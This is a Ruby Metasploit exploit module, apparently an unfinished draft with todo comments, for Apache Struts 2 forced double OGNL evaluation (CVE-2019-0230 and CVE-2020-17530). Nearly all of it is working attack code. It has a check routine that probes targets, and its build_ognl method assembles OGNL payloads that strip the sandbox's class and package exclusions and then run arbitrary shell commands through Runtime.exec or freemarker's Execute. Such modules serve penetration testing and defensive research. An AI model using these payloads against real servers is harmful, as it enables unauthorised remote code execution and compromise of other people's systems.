##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apache Struts 2 Forced Double OGNL Evaluation',
      'Description'    => %q{

      },
      'Author'         => [
        # todo: add the remaining authors
        'Spencer McIntyre' # Metasploit module
      ],
      'References'     => [
        # todo: add the references
      ],
      'Privileged'     => false,
      'Targets'        => [
        [
          'Unix Command',
          {
            'Platform' => 'unix',
            'Arch' => ARCH_CMD,
            'Type' => :unix_cmd,
          }
        ]
      ],
      'DisclosureDate' => '2018-08-22', # todo: set the disclosure date
      'DefaultTarget'  => 0))

    register_options([
      Opt::RPORT(8080),
      OptString.new('TARGETURI', [ true, 'A valid base path to a struts application', '/' ]),
      OptString.new('NAME', [ true, 'The HTTP query parameter or form data name', 'id']),
      OptEnum.new('CVE', [ true, 'Vulnerability to use', 'Automatic', ['Automatic', 'CVE-2020-17530', 'CVE-2019-0230']])
    ])
     # todo: add an HttpCookie advanced option if necessary
  end

  def check
    cves = []
    res = nil
    num1, num2 = rand(1000..9999), rand(1000..9999)

    %w{ CVE-2019-0230 CVE-2020-17530 }.each do |cve|
      next unless (datastore['CVE'] == 'Automatic' || datastore['CVE'] == cve)
      res = send_request_cgi(build_http_request(cve, "#{num1}*#{num2}"))
      if res && !res.body.scan((num1 * num2).to_s).empty?
        print_good("The endpoint is vulnerable to #{cve}")
        cves << cve
      end
    end

    return CheckCode::Unknown if res.nil?
    return CheckCode::Safe if cves.empty?
    @cves = cves
    CheckCode::Vulnerable(details: {cves: cves})
  end

  def exploit
    cve = @cves.first
    vprint_status("Exploiting #{cve}...")

    execute_command(payload.encoded, opts={cve: cve})
  end

  def execute_command(cmd, opts={})
    res = send_request_cgi(
      build_http_request(opts[:cve], build_ognl(opts[:cve], cmd))
    )
    fail_with(Failure::UnexpectedReply, 'Command execution failed') unless res
  end

  def build_http_request(cve, ognl)
    http_request_parameters = { 'uri' => normalize_uri(target_uri.path) }
    if cve == 'CVE-2019-0230'
      http_request_parameters['method'] = 'GET'
      http_request_parameters['vars_get'] = {datastore['NAME'] => "%{#{ognl}}"}
    elsif cve == 'CVE-2020-17530'
      http_request_parameters['method'] = 'POST'
      http_request_parameters['vars_post'] = {datastore['NAME'] => "%{#{ognl}}"}
    end
    http_request_parameters
  end

  def build_ognl(cve, cmd)
    ognl = []
    if cve == 'CVE-2019-0230'
      ognl << '(#context=#attr[\'struts.valueStack\'].context)'
      ognl << '(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS))'
      ognl << "(@java.lang.Runtime@getRuntime().exec('#{cmd}'))"
    elsif cve == 'CVE-2020-17530'
      ognl << '(#instancemanager=#application["org.apache.tomcat.InstanceManager"])'
      ognl << '(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"])'
      ognl << '(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap"))'
      ognl << '(#bean.setBean(#stack))'
      ognl << '(#context=#bean.get("context"))'
      ognl << '(#bean.setBean(#context))'
      ognl << '(#macc=#bean.get("memberAccess"))'
      ognl << '(#bean.setBean(#macc))'
      ognl << '(#emptyset=#instancemanager.newInstance("java.util.HashSet"))'
      ognl << '(#bean.put("excludedClasses",#emptyset))'
      ognl << '(#bean.put("excludedPackageNames",#emptyset))'
      ognl << '(#arglist=#instancemanager.newInstance("java.util.ArrayList"))'
      ognl << "(#arglist.add(\"#{cmd}\"))"
      ognl << '(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute"))'
      ognl << '(#execute.exec(#arglist))'
    end

    "#{ognl.join('.')}"
  end
end
